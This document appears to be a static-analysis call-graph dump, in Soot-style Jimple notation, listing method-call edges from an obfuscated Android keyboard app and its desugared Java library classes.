SPECIAL edge: specialinvoke $r0.<hny: void <init>(ivw,java.lang.String)>($r2, $r3) in <hny: hny a(hmm)> ==> <hny: void <init>(ivw,java.lang.String)>
VIRTUAL edge: $l2 = virtualinvoke $r1.<java.util.concurrent.atomic.AtomicLong: long getAndAdd(long)>(-4942790177534073029L) in <j$.util.concurrent.ThreadLocalRandom: void c()> ==> <java.util.concurrent.atomic.AtomicLong: long getAndAdd(long)>
VIRTUAL edge: $r3 = virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder insert(int,java.lang.String)>(0, "No logging platforms found:") in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder insert(int,java.lang.String)>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <lnc: boolean hasNext()>
VIRTUAL edge: $r2 = virtualinvoke r0.<lsn: lts l()>() in <lsd: boolean b(lsr)> ==> <lsn: lts l()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljf: int d(int)>($i0) in <lje: java.lang.Object next()> ==> <ljf: int d(int)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getKey()>() in <lli: void c(java.util.Map$Entry)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
INTERFACE edge: $r3 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getKey()>() in <lmb: lme f()> ==> <lki: java.lang.Object getKey()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int f(java.lang.Object)>($r1) in <ljd: java.lang.Object get(java.lang.Object)> ==> <ljd: int f(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljd: void p()>() in <ljd: java.util.Map m()> ==> <ljd: void p()>
STATIC edge: $r12 = staticinvoke <hnc: java.lang.String d(hmm)>($r10) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hnc: java.lang.String d(hmm)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
STATIC edge: $i1 = staticinvoke <j$.util.concurrent.r: int i(java.lang.Object,java.lang.Object)>($r1, $r8) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.r: int i(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r17 = virtualinvoke $r15.<java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>($r16) in <lvm: lum j()> ==> <java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>
STATIC edge: staticinvoke <iye: void O(int,int)>($i0, $i1) in <lqm: java.lang.Object get(int)> ==> <iye: void O(int,int)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("invalid maximum depth: 0") in <lwf: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.lang.String: int hashCode()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(1) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: $r7 = virtualinvoke r0.<ljd: java.lang.Object j()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object j()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: boolean equals(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.String: int length()>() in <ivv: ivw a()> ==> <java.lang.String: int length()>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lwk: void <init>()> ==> <java.lang.Object: void <init>()>
STATIC edge: $r1 = staticinvoke <lqq: lqq r(int,java.lang.Object[],lkt)>($i0, $r0, null) in <lqq: lqq a(int,java.lang.Object[])> ==> <lqq: lqq r(int,java.lang.Object[],lkt)>
STATIC edge: $r5 = staticinvoke <ivw: java.lang.String[] Q(java.util.List)>($r4) in <ivw: void <init>(ivv,java.lang.String)> ==> <ivw: java.lang.String[] Q(java.util.List)>
SPECIAL edge: specialinvoke $r13.<mag: void <init>(java.lang.String,int,int)>("AVATAR_STICKER_METADATA", 13, 13) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r7.<lsq: int a()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsp: int a()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorImageThumbnail", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: $z0 = virtualinvoke r0.<liz: boolean hasNext()>() in <liz: java.lang.Object next()> ==> <liz: boolean hasNext()>
SPECIAL edge: specialinvoke $r0.<lkl: void <init>()>() in <lkq: lkl e()> ==> <lkl: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljf: java.util.Set g()>() in <ljf: int size()> ==> <ljf: java.util.Set g()>
VIRTUAL edge: $r8 = virtualinvoke $r7.<lsc: lsw d()>() in <ivw: ivw d(java.util.Locale)> ==> <lsc: lsw d()>
VIRTUAL edge: virtualinvoke r0.<lss: void setStackTrace(java.lang.StackTraceElement[])>($r2) in <lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])> ==> <java.lang.Throwable: void setStackTrace(java.lang.StackTraceElement[])>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.List: java.util.Iterator iterator()>() in <ivv: java.lang.String c()> ==> <java.util.ArrayList: java.util.Iterator iterator()>
INTERFACE edge: interfaceinvoke $r0.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r6) in <iej: void g(java.lang.String,iec)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(14) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljd: java.lang.Object[] y()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lmb: void <init>()>() in <hbv: void j()> ==> <lmb: void <init>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
CLINIT edge: staticinvoke <mag: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <mag: void <clinit>()>
STATIC edge: $i5 = staticinvoke <izw: int ah(int)>($i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int ah(int)>
CLINIT edge: staticinvoke <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()>
SPECIAL edge: specialinvoke $r1.<ljb: void <init>(ljd,int)>($r2, $i0) in <liw: java.lang.Object a(int)> ==> <ljb: void <init>(ljd,int)>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("forced", class "Ljava/lang/Boolean;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lvr: int size()>() in <lvr: int b()> ==> <java.util.AbstractMap: int size()>
SPECIAL edge: specialinvoke r0.<lkq: void <init>()>() in <lqm: void <init>(lqn)> ==> <lkq: void <init>()>
SPECIAL edge: specialinvoke r0.<lsz: void <init>(java.lang.String,java.lang.Class,boolean)>("group_by", $r1, 1) in <lsj: void <init>(java.lang.Class)> ==> <lsz: void <init>(java.lang.String,java.lang.Class,boolean)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/experiment/FlagManager") in <hcb: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.util.Map o()>() in <ljd: int size()> ==> <ljd: java.util.Map o()>
STATIC edge: staticinvoke <iwt: void r(char[],int,int,char,char,int)>($r1, $i3, $i4, $c0, $c1, $i2) in <iwt: char[] s(java.lang.String,char,char,int)> ==> <iwt: void r(char[],int,int,char,char,int)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getValue()>() in <llg: java.lang.Object next()> ==> <lki: java.lang.Object getValue()>
SPECIAL edge: specialinvoke r0.<lkg: void <init>(int)>(4) in <lly: void <init>()> ==> <lkg: void <init>(int)>
VIRTUAL edge: $c0 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(0) in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: char charAt(int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getKey()>() in <lid: int hashCode()> ==> <ljb: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r9.<mag: void <init>(java.lang.String,int,int)>("AUTOCOMPLETE", 9, 9) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: java.lang.String toString()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <idq: void <init>(java.lang.String,mag)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r26.<j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)>($i9, $r15, $r16, null, null) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.e: void <init>(j$.util.concurrent.ConcurrentHashMap)>(r0) in <j$.util.concurrent.ConcurrentHashMap: java.util.Set entrySet()> ==> <j$.util.concurrent.e: void <init>(j$.util.concurrent.ConcurrentHashMap)>
STATIC edge: $z0 = staticinvoke <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)>($r1, $r2) in <hbv: boolean o()> ==> <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hbw: void <init>(int)> ==> <java.lang.Object: void <init>()>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.lang.Iterable: java.util.Iterator iterator()>() in <izw: java.util.Collection at(java.lang.Iterable)> ==> <liy: java.util.Iterator iterator()>
SPECIAL edge: $r3 = specialinvoke r0.<ljf: int[] r()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: int[] r()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r1, $i2, $r23) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
SPECIAL edge: specialinvoke r0.<lme: void <init>(lkx,int)>($r1, 0) in <ljs: void <init>()> ==> <lme: void <init>(lkx,int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c0) in <ivw: boolean u(char)> ==> <ivw: boolean x(char)>
VIRTUAL edge: virtualinvoke r0.<ljd: int b()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int b()>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lmb: lme f()> ==> <lje: boolean hasNext()>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.String: char[] toCharArray()>() in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: char[] toCharArray()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(5) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lfb: void <init>(lfa)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljf: void h()>() in <ljf: java.util.Set f()> ==> <ljf: void h()>
INTERFACE edge: $r9 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getValue()>() in <lmb: lme f()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r16.<lsu: void <init>()>() in <lsd: boolean b(lsr)> ==> <lsu: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r4.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lta: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c3) in <ivw: boolean w(char[],int,int)> ==> <ivw: boolean u(char)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String substring(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
STATIC edge: $r17 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(java.lang.String)>($r12) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lje: void <init>(ljf)> ==> <java.lang.Object: void <init>()>
STATIC edge: $r3 = staticinvoke <java.lang.Thread: java.lang.Thread currentThread()>() in <ojg: void v(java.lang.String)> ==> <java.lang.Thread: java.lang.Thread currentThread()>
STATIC edge: $r3 = staticinvoke <lme: lmb g()>() in <hbv: void j()> ==> <lme: lmb g()>
CLINIT edge: staticinvoke <lqk: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqk: void <clinit>()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.ExceptionInInitializerError: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r5 = virtualinvoke $r12.<lts: java.lang.Object d(lsz)>($r13) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <ltr: java.lang.Object d(lsz)>
SPECIAL edge: specialinvoke $r15.<mag: void <init>(java.lang.String,int,int)>("BITMOJI_IMAGE", 15, 15) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i8 = virtualinvoke $r13.<lvq: int size()>() in <lvr: void <init>(lvr,lvr)> ==> <lvq: int size()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <java.lang.Character$UnicodeBlock: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Character$UnicodeBlock: void <clinit>()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Error: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <miv: void <init>(java.lang.Object)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<lvr: boolean isEmpty()>() in <lvt: boolean a()> ==> <java.util.AbstractMap: boolean isEmpty()>
STATIC edge: $r4 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r4, $i0) in <lsn: void q(lsz,java.lang.Object)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r4, $r5) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean s(java.lang.String)> ==> <java.lang.String: int length()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <lvt: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.k: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean w(char[],int,int)>($r3, $i0, $i1) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean w(char[],int,int)>
SPECIAL edge: $i3 = specialinvoke r0.<qj: int j()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <qj: int j()>
VIRTUAL edge: $r4 = virtualinvoke $r3.<java.lang.Object: java.lang.Class getClass()>() in <iej: void g(java.lang.String,iec)> ==> <java.lang.Object: java.lang.Class getClass()>
STATIC edge: $z0 = staticinvoke <j$.sun.misc.a: boolean a(sun.misc.Unsafe,java.lang.Object,long,java.lang.Object)>($r2, $r3, $l0, $r1) in <j$.sun.misc.b: boolean e(java.lang.Object,long,java.lang.Object)> ==> <j$.sun.misc.a: boolean a(sun.misc.Unsafe,java.lang.Object,long,java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean w(char[],int,int)>($r3, $i3, $i6) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean w(char[],int,int)>
VIRTUAL edge: $r4 = virtualinvoke $r3.<java.lang.StringBuilder: java.lang.String toString()>() in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid language \'%s\', fallback to \'en\'", $r0, $r4) in <ivw: ivw d(java.util.Locale)> ==> <lsv: void F(java.lang.String,java.lang.Object,java.lang.Object)>
STATIC edge: $r1 = staticinvoke <lum: lvm i()>() in <lum: boolean n(java.lang.String,java.util.logging.Level,boolean)> ==> <lum: lvm i()>
STATIC edge: $r4 = staticinvoke <java.util.Arrays: int[] copyOf(int[],int)>($r4, $i0) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: int[] copyOf(int[],int)>
STATIC edge: $r4 = staticinvoke <lsq: lsq e(java.lang.String,java.lang.String,int,java.lang.String)>($r3, $r1, $i0, $r2) in <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)> ==> <lsq: lsq e(java.lang.String,java.lang.String,int,java.lang.String)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(7) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: staticinvoke <ojg: void c(java.lang.Object,java.lang.String)>($r4, "copyOf(this, newSize)") in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ojg: void c(java.lang.Object,java.lang.String)>
STATIC edge: $r2 = staticinvoke <iwt: java.lang.String e(java.lang.String)>($r2) in <ivv: void f(java.lang.String)> ==> <iwt: java.lang.String e(java.lang.String)>
SPECIAL edge: specialinvoke $r16.<mag: void <init>(java.lang.String,int,int)>("UNKNOWN_GRPC_FEATURE", 16, 16) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r22.<mag: void <init>(java.lang.String,int,int)>("LOCAL", 22, 22) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r0.<ljs: void <init>()>() in <ljs: void <clinit>()> ==> <ljs: void <init>()>
CLINIT edge: staticinvoke <lwe: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lwe: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(17) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Empty subtag, error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lkf: void <init>()>() in <lqk: void <init>(java.lang.Object,java.lang.Object[],int,lqk)> ==> <lkf: void <init>()>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <lak: void <init>(byte[])> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lsb: java.lang.Object a(int)>($i1) in <lsb: java.lang.Object next()> ==> <lnd: java.lang.Object a(int)>
STATIC edge: $r1 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r1) in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(long[],long[])>($r10, $r11) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(long[],long[])>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(16) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke $r4.<hbv: void <init>(java.lang.String)>($r0) in <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)> ==> <hbv: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <iwt: boolean k(char)>($c0) in <iwt: java.lang.String d(java.lang.String)> ==> <iwt: boolean k(char)>
VIRTUAL edge: virtualinvoke $r3.<hbv: void k(java.lang.Object,boolean)>($r1, 0) in <hcb: hbv j(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object,java.lang.Object)> ==> <hbv: void k(java.lang.Object,boolean)>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqm: java.lang.Object get(int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r0.<androidx.core.content.FileProvider: int delete(android.net.Uri,java.lang.String,java.lang.String[])>(null, "", $r3) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: int delete(android.net.Uri,java.lang.String,java.lang.String[])>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(19) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r5.<java.util.AbstractMap$SimpleImmutableEntry: void <init>(java.lang.Object,java.lang.Object)>($r3, $r4) in <lqm: java.lang.Object get(int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: void <init>(java.lang.Object,java.lang.Object)>
SPECIAL edge: $i2 = specialinvoke r0.<lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])>($r6, $i3, $i2, $r4, $r5) in <lvr: void <init>(lvr,lvr)> ==> <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("Gif", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i1) in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $l0 = virtualinvoke $r0.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/r;", "lockState") in <j$.util.concurrent.r: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<lkq: boolean isEmpty()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.util.AbstractCollection: boolean isEmpty()>
VIRTUAL edge: $r2 = virtualinvoke $r4.<java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()>() in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String toString()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r4 = staticinvoke <lma: lma i(int,java.lang.Object[])>($i5, $r2) in <lma: lma i(int,java.lang.Object[])> ==> <lma: lma i(int,java.lang.Object[])>
VIRTUAL edge: $r0 = virtualinvoke $r1.<java.lang.ThreadLocal: java.lang.Object get()>() in <j$.util.concurrent.ThreadLocalRandom: int b()> ==> <java.lang.ThreadLocal: java.lang.Object get()>
STATIC edge: staticinvoke <iwt: void f(char[],int,int)>($r3, 0, $i0) in <ivv: ivw b(java.lang.String)> ==> <iwt: void f(char[],int,int)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r2, "parser") in <lup: void <init>(lwc,java.lang.String)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
STATIC edge: $r6 = staticinvoke <lma: lma v(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)>($r5, $r0, $r1, $r2, $r3) in <iwt: void <clinit>()> ==> <lma: lma v(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r3.<lsm: int a(lsz)>($r2) in <lsn: void q(lsz,java.lang.Object)> ==> <lsm: int a(lsz)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<lkx: lma p()>() in <llg: void <init>(llo)> ==> <lkx: lma p()>
STATIC edge: $r2 = staticinvoke <iwt: java.lang.String c(java.lang.String)>($r2) in <ivv: void e(java.lang.String)> ==> <iwt: java.lang.String c(java.lang.String)>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: staticinvoke <lri: void t(java.lang.Object,int)>($r1, $i1) in <lri: void v(java.lang.Object[],int)> ==> <lri: void t(java.lang.Object,int)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "log site qualifier") in <lta: void <init>(lsr,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean B(java.lang.String)> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke $r5.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <ivv: ivw a()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean y(char)>($c5) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean y(char)>
STATIC edge: $i0 = staticinvoke <lma: int e(int)>($i0) in <lly: void j(java.lang.Object)> ==> <lma: int e(int)>
VIRTUAL edge: $r1 = virtualinvoke $r4.<java.lang.String: java.lang.String concat(java.lang.String)>($r1) in <ivv: void g(java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ojg: boolean f(java.lang.Object,java.lang.Object)>($r1, $r4) in <qj: int i(java.lang.Object,int)> ==> <ojg: boolean f(java.lang.Object,java.lang.Object)>
